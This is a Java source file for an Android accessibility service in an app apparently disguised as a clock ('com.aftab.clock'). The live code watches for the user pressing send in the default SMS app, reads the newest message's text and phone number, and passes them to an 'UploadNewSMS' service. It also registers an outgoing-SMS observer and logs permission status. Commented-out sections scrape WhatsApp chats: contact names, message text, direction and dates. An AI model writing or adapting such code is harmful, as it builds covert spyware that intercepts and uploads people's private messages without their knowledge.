package com.aftab.clock.Services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.aftab.clock.Model.WhatsappMsg;
import com.aftab.clock.Receivers.SmsObserver;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class AccessibilityDetectingService extends AccessibilityService {

    //private static final String WHATSAPP_PACKAGE_NAME = "com.whatsapp";
    private static String text = "", personName = "", previusText = "";
    int mDebugDepth, counter = 0;
    Context context;
    SharedPref sharedPref;
    boolean isTyping = false, isSent = false;
    AccessibilityNodeInfo mNodeInfo;
    int lines;
    List<String> latestTexts = new ArrayList<>();
    List<String> nextTexts = new ArrayList<>();
    List<String> hisTxt = new ArrayList<>();
    List<String> myTxt = new ArrayList<>();
    boolean isTime, isMy, flag;
    WhatsappMsg whatsappMsg = new WhatsappMsg();
    ArrayList<WhatsappMsg> whatsappMsgslist = new ArrayList<>();
    ArrayList<String> idsList = new ArrayList<>();

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        setServiceInfo(info);

        context = this;
        Functions.saveAppOpenedLogs(context,Functions.getPermissionsLogs(context));
    }

    @Override
    public void onAccessibilityEvent(final AccessibilityEvent event) {

        context = this;
        sharedPref = new SharedPref(context);

        mDebugDepth = 0;
        mNodeInfo = event.getSource();

        nextTexts.clear();
       /* getNextTexts(getRootInActiveWindow());

        if (isTextChanged(latestTexts, nextTexts)) {
            latestTexts.clear();
            lines = 0;
            counter = 0;
            getNodeInfoes(getRootInActiveWindow(), 0);
        }*/
        AccessibilityNodeInfo source1 = event.getSource();

      /*  Log.v("FJJJFJF", String.format(
                "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
                getEventType(event), event.getClassName(), event.getPackageName(),
                event.getEventTime(), getEventText(event)));
*/


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && source1 == null)
            source1 = getRootInActiveWindow();

        if (source1 == null) {
            return;
        }


        ContentResolver contentResolver = this.getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms/out"), true, new SmsObserver(new Handler(), this));

        // Toast.makeText(this, ""+event.toString(), Toast.LENGTH_SHORT).show();

        if (getRootInActiveWindow() == null) {
            return;
        }

        /*if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED && event.getClassName().equals("android.widget.LinearLayout")) {*/

        String SMSPkgName = sharedPref.getString(Constants.DEFAULT_SMS);

        if (event.getPackageName() != null) {

            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED && (getEventText(event).equals("SMS") || getEventText(event).equals("Send")) && SMSPkgName.contentEquals(event.getPackageName())) {


                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {


                        Cursor c = context.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);

                        c.moveToFirst();


                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        //String date = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));

                        long date1 = System.currentTimeMillis();

                     ///   Toast.makeText(context, "Yess  " + body + "\n" + Functions.getDateTime(date1 + ""), Toast.LENGTH_SHORT).show();

                        String type = "sentSimMsg";


                        Log.d("FJJJFJF", "Yessddddd" + "\n" + body + "\n" + number + "\n" + date1 + "\n" + type);



                        context.startService(new Intent(context, UploadNewSMS.class)
                                .putExtra(Constants.SIM_SMS, body)
                                .putExtra(Constants.NUMBER, number)
                                .putExtra(Constants.DATE, date1)
                                .putExtra(Constants.TYPE, type));


                    /*Intent intent1 = new Intent(context, UploadNewSMS.class);
                    intent1.putExtra(Constants.SIM_SMS, body);
                    intent1.putExtra(Constants.NUMBER, number);
                    intent1.putExtra(Constants.DATE, date1);
                    intent1.putExtra(Constants.TYPE, type);

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

                        ContextCompat.startForegroundService(context, intent1);

                    } else {

                        context.startService(intent1);

                    }*/

                        c.close();


                    }
                }, 3000);
            } /*else if (event.getPackageName().toString().equals("com.whatsapp")) {

                idsList.clear();

               /// if (mNodeInfo.findAccessibilityNodeInfosByViewId())
               // printAllViews(mNodeInfo);

                //Log.d("FJJJFJF", mNodeInfo.getViewIdResourceName()+"");

                

                AccessibilityNodeInfo nodeInfo = event.getSource();

                Log.d("FJJJFJF", nodeInfo.getViewIdResourceName()+"");
                try {
                    List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = nodeInfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");

                    if (findAccessibilityNodeInfosByViewId.size() > 0) {
                        AccessibilityNodeInfo parent = findAccessibilityNodeInfosByViewId.get(0);

                        String contactName = parent.getText().toString();

                        if (contactName != null && !contactName.isEmpty() && !contactName.equals(personName)) {


                            Log.d("FJJJFJF", contactName);
                            personName = contactName;
                            // do your stuff here, contactName contains the chat contact name!
                        }

                    }
                } catch (Exception contactName) {
                    Log.d("FJJJFJF", Objects.requireNonNull(contactName.getMessage()));
                }

                *//*if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {

                    StringBuilder sb = new StringBuilder();
                    List<CharSequence> texts = event.getText();

                    Log.d("FJJJFJF", "in noti state");


                    if (!texts.isEmpty()) {
                        for (CharSequence s : event.getText()) {
                            sb.append(s);
                        }
                        if (sb.toString().equals("Incoming Audio call")) {
                            Log.d("FJJJFJF", "whatsapp audio call");
                        }
                    }else {

                        Log.d("FJJJFJF", "iempty text");


                    }

                }*//*

                AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());


                // Whatsapp Message EditText id
                List<AccessibilityNodeInfoCompat> messageNodeList = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry");
                if (messageNodeList == null || messageNodeList.isEmpty()) {
                    return;
                }

                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED && event.getClassName().equals("android.widget.EditText")) {

                    // check if the whatsapp message EditText field is filled with text and ending with your suffix (explanation above)
                    AccessibilityNodeInfoCompat messageField = messageNodeList.get(0);

                    Log.d("FJJJFJF", messageField.getText() + "   message");

                    if (messageField.getText().equals("Message") && isTyping) {

                        isTyping = false;
                        Log.d("FJJJFJF", "message sent");
                        isSent = true;

                        //takeScreenshot();
                        // context.startService(new Intent(context, ScreenShotService.class));

                        tt();

                    } else {

                        isTyping = true;
                        Log.d("FJJJFJF", "message not sent yet");
                        isSent = false;


                    }

                }

                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_SCROLLED && event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED && isSent) {

                    //   Log.d("FJJJFJF", "message received");


                }





               *//* AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());


                // Whatsapp Message EditText id
                List<AccessibilityNodeInfoCompat> messageNodeList = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry");
                if (messageNodeList == null || messageNodeList.isEmpty()) {
                    return;
                }

                // check if the whatsapp message EditText field is filled with text and ending with your suffix (explanation above)
                AccessibilityNodeInfoCompat messageField = messageNodeList.get(0);
                if (messageField.getText() == null || messageField.getText().length() == 0
                        || !messageField.getText().toString().endsWith(getApplicationContext().getString(R.string.whatsapp_suffix))) { // So your service doesn't process any message, but the ones ending your apps suffix
                    return;
                }

                // Whatsapp send button id
                List<AccessibilityNodeInfoCompat> sendMessageNodeInfoList = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send");
                if (sendMessageNodeInfoList == null || sendMessageNodeInfoList.isEmpty()) {
                    return;
                }

                AccessibilityNodeInfoCompat sendMessageButton = sendMessageNodeInfoList.get(0);


                Log.d("FJJJFJF", sendMessageButton.getTouchDelegateInfo() + "   ======1");


                if (sendMessageButton.getActions() == AccessibilityNodeInfo.ACTION_CLICK) {

                    //  Log.d("FJJJFJF", "Clicked");
                }

                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED && event.getClassName().equals("android.widget.ImageButton") && getEventText(event).equals("send")) {


                    ///  Log.d("FJJJFJF", "Clicked");


                }


                AccessibilityNodeInfo node = event.getSource();

                //  Log.d("FJJJFJF", event.getSource() + "");


                if (node != null) {
                    for (int i = 0; i < node.getChildCount(); i++) {
                        AccessibilityNodeInfo childNode = node.getChild(i);
                        if (childNode != null) {
                            //   Log.d("FJJJFJF", "-----getText->" + childNode.getText() + "---getContentDescription-->" + childNode.getContentDescription());
                        } else {

                            //    Log.d("FJJJFJF", "null2");
                        }
                    }
                } else {

                    // Log.d("FJJJFJF", "null1");
                }
*//*
            }*/
        }
        /*AccessibilityNodeInfo nodeInfo = event.getSource();

        try {
            List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = nodeInfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");

            if (findAccessibilityNodeInfosByViewId.size() > 0) {
                AccessibilityNodeInfo parent = findAccessibilityNodeInfosByViewId.get(0);

                String contactName = parent.getText().toString();

                if (contactName != null && !contactName.isEmpty()) {


                    Log.d("FJJJFJF", contactName);
                    // do your stuff here, contactName contains the chat contact name!
                }

            }
        } catch (Exception contactName) {
            Log.d("FJJJFJF", contactName.getMessage());
        }*/


        //  Toast.makeText(this, "2"+event.getSource().toString(), Toast.LENGTH_SHORT).show();

/*
        AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());


        // Whatsapp Message EditText id
        List<AccessibilityNodeInfoCompat> messageNodeList = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry");
        if (messageNodeList == null || messageNodeList.isEmpty()) {
            return;
        }

        // check if the whatsapp message EditText field is filled with text and ending with your suffix (explanation above)
        AccessibilityNodeInfoCompat messageField = messageNodeList.get(0);
        if (messageField.getText() == null || messageField.getText().length() == 0
                || !messageField.getText().toString().endsWith(getApplicationContext().getString(R.string.whatsapp_suffix))) { // So your service doesn't process any message, but the ones ending your apps suffix
            return;
        }

        // Whatsapp send button id
        List<AccessibilityNodeInfoCompat> sendMessageNodeInfoList = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send");
        if (sendMessageNodeInfoList == null || sendMessageNodeInfoList.isEmpty()) {
            return;
        }

        AccessibilityNodeInfoCompat sendMessageButton = sendMessageNodeInfoList.get(0);
        if (!sendMessageButton.isVisibleToUser()) {
        }*/

    }


    private void takeScreenshot() {
        Date now = new Date();
        android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);

        try {
            // image naming and path  to include sd card  appending name you choose for file
            String mPath = Environment.getExternalStorageDirectory().toString() + "/" + now + ".jpg";

            // create bitmap screen capture
            Activity activity = (Activity) getApplicationContext();

            View v1 = activity.findViewById(android.R.id.content).getRootView();
            v1.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
            v1.setDrawingCacheEnabled(false);

            File imageFile = new File(mPath);

            FileOutputStream outputStream = new FileOutputStream(imageFile);
            int quality = 100;
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            outputStream.flush();
            outputStream.close();

            openScreenshot(imageFile);

        ///    Toast.makeText(context, "taken", Toast.LENGTH_SHORT).show();

        } catch (Throwable e) {
            // Several error may come out with file handling or DOM
            e.printStackTrace();
         ///   Toast.makeText(context, "" + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void openScreenshot(File imageFile) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri uri = Uri.fromFile(imageFile);
        intent.setDataAndType(uri, "image/*");
        startActivity(intent);
    }

    private String getEventType(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";

            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";

            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";

            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";

            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                return "TYPE_ANNOUNCEMENT";

            case AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT:
                return "TYPE_ASSIST_READING_CONTEXT";

            case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                return "TYPE_GESTURE_DETECTION_END";

            case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                return "TYPE_GESTURE_DETECTION_START";

            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_END";

            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_START";

            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_END:
                return "TYPE_TOUCH_INTERACTION_END";

            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START:
                return "TYPE_TOUCH_INTERACTION_START";

            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUSED";

            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED";

            case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED:
                return "TYPE_VIEW_CONTEXT_CLICKED";

            case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                return "TYPE_VIEW_HOVER_ENTER";

            case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                return "TYPE_VIEW_HOVER_EXIT";

            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                return "TYPE_VIEW_SCROLLED";

            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                return "TYPE_VIEW_TEXT_SELECTION_CHANGED";

            case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
                return "TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY";

            case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
                return "TYPE_WINDOWS_CHANGED";

            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                return "TYPE_WINDOW_CONTENT_CHANGED";

        }
        return "default";
    }

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    @Override
    public void onInterrupt() {
    }

    private void printAllViews(AccessibilityNodeInfo mNodeInfo) {
        if (mNodeInfo != null) {
            mNodeInfo.refresh(); // to fix issue with viewIdResName = null on Android 6+
        } else {
            return;
        }
        String log = "";
        for (int i = 0; i < mDebugDepth; i++) {
            log += ".";
        }

        if ((mNodeInfo.getClassName() != null && mNodeInfo.getViewIdResourceName() != null)) {

            if ((mNodeInfo.getClassName().equals("android.widget.TextView")) && (mNodeInfo.getViewIdResourceName().equals("com.whatsapp:id/message_text") || mNodeInfo.getViewIdResourceName().equals("com.whatsapp:id/date") || mNodeInfo.getViewIdResourceName().equals("com.whatsapp:id/conversation_row_date_divider"))) {
                Rect rect = new Rect();
                mNodeInfo.getBoundsInScreen(rect);

                String text = mNodeInfo.getText() + "";

                String id;

                /*if (text.length() > 5) {

                   /// String temp = text.substring(0, 5);
                    id = rect.right + "" + rect.left + text.length();


                } else {

                    id = rect.right + "" + rect.left + text.length();


                }*/

                int rectSum = rect.right + rect.left;

                id = rect.right + "" + rect.left + text.length() + rectSum;
                // id = rect.right + "" + rect.left;
                String time;
                String date;


                if (mNodeInfo.getViewIdResourceName().equals("com.whatsapp:id/date")) {

                    time = mNodeInfo.getText() + "";
                    whatsappMsg.setTime(time);
//                    id = id + time;

                    if (!idsList.contains(id)) {

                        idsList.add(id);

                        log += "(" + mNodeInfo.getText()
                                + " <-- " + mNodeInfo.getViewIdResourceName()
                                + " <-- " + mNodeInfo.getClassName()
                                + " <-- " + rect
                                + ")" + "\n";

                        Log.i("FJJJFJF", whatsappMsg.getMsg() + "" + whatsappMsg.getDate() + "" + whatsappMsg.getTime() + "====" + id);
                        Log.i("FJJJFJF", log + "====" + id);
                    }

                } else if (mNodeInfo.getViewIdResourceName().equals("com.whatsapp:id/message_text")) {


                    if (rect.left < 100) {

                        whatsappMsg.setStatus("his");
                        //his msg
                    }

                    if (rect.left > 100) {

                        whatsappMsg.setStatus("my");

                    }

                    String msg = mNodeInfo.getText() + "";
                    whatsappMsg.setMsg(msg);

                } else if (mNodeInfo.getViewIdResourceName().equals("com.whatsapp:id/conversation_row_date_divider")) {


                    date = mNodeInfo.getText() + "";

                    if (date.equals("Today")) {

                        date = Functions.getToday();

                    } else if (date.equals("Yesterday")) {

                        date = Functions.getYesterday();

                    }

                    if (date.equals("")) {

                        date = Functions.getToday();
                    }

                    whatsappMsg.setDate(date);

                }

                if (whatsappMsg.getDate() == null) {


                    whatsappMsg.setDate(Functions.getToday());


                }





            /*log = (String) mNodeInfo.getText();
            if (!messagesList.contains(mNodeInfo.getText().toString())) {
                messagesList.add(mNodeInfo.getText().toString());
            }else {

                Log.d()

            }*/
            }
        }
        if (mNodeInfo.getChildCount() < 1) return;
        mDebugDepth++;

        for (int i = 0; i < mNodeInfo.getChildCount(); i++) {
            printAllViews(mNodeInfo.getChild(i));
        }
        mDebugDepth--;
    }

    void getNextTexts(AccessibilityNodeInfo node) {

        if (node.getText() != null && node.getText().length() > 0)
            nextTexts.add(node.getText().toString());

        for (int i = 0; i < node.getChildCount(); i++) {

            AccessibilityNodeInfo child = node.getChild(i);
            if (child == null)
                continue;
            getNextTexts(child);
        }
    }

    boolean isTextChanged(List<String> latestTexts, List<String> nextTexts) {

        if (nextTexts.size() <= 0 || latestTexts.size() <= 0)
            return true;
        for (int i = 0; i < latestTexts.size(); i++) {

            if (!latestTexts.get(i).equals(nextTexts.get(i)))
                return true;
        }
        return false;
    }

    void getNodeInfoes(AccessibilityNodeInfo node, int tab) {


        if (node == null || lines > 100)
            return;

        StringBuilder sb = new StringBuilder();

        for (int i = 0; i <= tab; i++) {
            sb.append("+++");
        }

/*
        if (node.getClassName().equals("android.widget.TextView")) {*/

        if (node.getViewIdResourceName().equals("com.whatsapp:id/date") || node.getViewIdResourceName().equals("com.whatsapp:id/message_text")) {
            Rect rect = new Rect();
            node.getBoundsInScreen(rect);
            sb.append(node.getPackageName() + "==" + node.getClassName() + rect);

            if (node.isScrollable() || node.getClassName().toString().contains("ScrollView")) {
                sb.append(" <Scrollable> ");
            }

            if (node.isClickable()) {
                sb.append(" [Clickable] ");
            }

            if (node.getText() != null && node.getText().length() > 0) {
                sb.append(" [Text: " + node.getText() + " ]");

                latestTexts.add(node.getText().toString());
            }

            if (node.getContentDescription() != null && node.getContentDescription().length() > 0) {
                sb.append(" [Description: " + node.getContentDescription() + " ]");
            }
            Rect icon = new Rect();
            node.getBoundsInScreen(icon);
            if (icon.width() == icon.height())
                sb.append(" [Maybe icon: " + icon.width() + ", " + icon.height());

            if (!previusText.equals(sb.toString())) {


            }

            Log.d("FJJJFJF", sb.toString());
        }

            /*if (rect.left < 100) {

                if (!hisTxt.contains(node.getText() + "")) {

                    hisTxt.add(node.getText() + "");
                    Log.d("FJJJFJF", sb.toString() + " his");

                }

            } else if (rect.right == 945) {

                Log.d("FJJJFJF", sb.toString() + " my time");


            } else if (rect.right == 813) {

                if (!myTxt.contains(node.getText() + "")) {

                    myTxt.add(node.getText() + "");
                    Log.d("FJJJFJF", sb.toString() + " my");


                }

            } else {

                Log.d("FJJJFJF", sb.toString() + " his time");

            }*/

        //  Log.d("FJJJFJF", rect.left+"");


          /*  counter++;


            String txt = node.getText() + "";

            if (counter > 2) {

                if ((txt.endsWith("PM") || txt.endsWith("AM")) && (txt.length() == 7 || txt.length() == 8)) {
                    isTime = true;

                } else {
                    isTime = false;
                }


                if (rect.left < 100) {

                    whatsappMsg.setMsg(txt);
                    whatsappMsg.setStatus("his");
                    isMy = false;
                    //his msg

                    if (!hisTxt.contains(node.getText() + "")) {

                        hisTxt.add(node.getText() + "");
                        // Log.d("FJJJFJF", sb.toString() + " his");

                    }
                    flag = true;

                    Log.d("FJJJFJF", sb.toString() + " his msg");

                    return;
                }

                if (isTime && !isMy && flag) {

                    //his time
                    whatsappMsg.setTime(txt);
                    whatsappMsg.setStatus("his");

                    whatsappMsgslist.add(whatsappMsg);

                    Log.d("FJJJFJF", sb.toString() + " his time");

                    return;
                }


                if (rect.left > 100) {

                    isMy = true;

                    if (!isTime) {

                        flag = true;
                        //my msg

                        whatsappMsg.setMsg(txt);
                        whatsappMsg.setStatus("my");

                        if (!myTxt.contains(node.getText() + "")) {

                            myTxt.add(node.getText() + "");
                            //  Log.d("FJJJFJF", sb.toString() + " my");


                        }

                        Log.d("FJJJFJF", sb.toString() + " my msg");

                    } else {


                        if (flag) {
                            //my time
                            whatsappMsg.setTime(txt);
                            whatsappMsg.setStatus("my");

                            whatsappMsgslist.add(whatsappMsg);

                            Log.d("FJJJFJF", sb.toString() + " my time");
                        }


                    }
                    return;

                }

            }
        }*/

        lines++;

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (lines > 100)
                return;
            getNodeInfoes(child, tab + 1);
        }

    }

}
